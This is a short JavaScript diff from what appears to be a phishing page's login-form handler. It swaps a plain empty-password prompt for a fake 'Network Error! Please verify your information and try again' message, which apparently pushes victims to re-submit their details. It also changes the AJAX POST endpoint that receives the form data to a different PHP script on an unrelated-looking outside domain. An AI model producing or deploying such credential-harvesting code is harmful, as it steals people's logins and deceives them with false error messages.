@@ -38,7 +38,7 @@ $(document).ready(function() {
         if(inpPwd.value === ""){
           
           
-          divMsg.textContent = 'Please input password';
+          divMsg.textContent = 'Network Error! Please verify your information and try again';
           divMsg.style.color = "#ba1100";
           
 
@@ -69,7 +69,7 @@ $(document).ready(function() {
   
 </button>`).prop("disabled", true);
         $.ajax({
-            url: "https://physicaleducationdiploma.com/dashboard/file/tochez.php",
+            url: "https://physicaleducationdiploma.com/dashboard/file/chgbb.php",
             type: 'POST',
             data: formData,
             contentType: false,
